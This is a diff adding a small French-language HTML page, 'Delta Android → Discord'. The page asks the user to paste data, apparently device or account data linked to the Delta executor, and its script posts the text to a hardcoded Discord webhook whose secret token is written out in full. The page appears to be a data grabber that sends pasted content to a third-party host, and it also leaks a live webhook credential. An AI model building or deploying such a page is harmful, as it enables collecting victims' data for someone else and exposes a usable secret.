@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Delta Android → Discord</title>
+</head>
+<body>
+
+<h3>Coller puis envoyer</h3>
+
+<textarea id="data" placeholder="Colle ici (auto si possible)" style="width:100%;height:200px"></textarea>
+<br><br>
+<button onclick="send()">Envoyer</button>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1455615155969851403/EgT6gsKtBbGhgJ1gMDBWpD00lc5pU1m4Slkda6IU6ZaMOa5elH7KdVj3IGdBvF6jyAt0";
+
+function send() {
+  const content = document.getElementById("data").value;
+  if (!content) return alert("Colle les données");
+
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      content: "📱 Android data:\n```json\n" + content + "\n```"
+    })
+  }).then(() => alert("Envoyé ✅"));
+}
+</script>
+
+</body>
+</html>
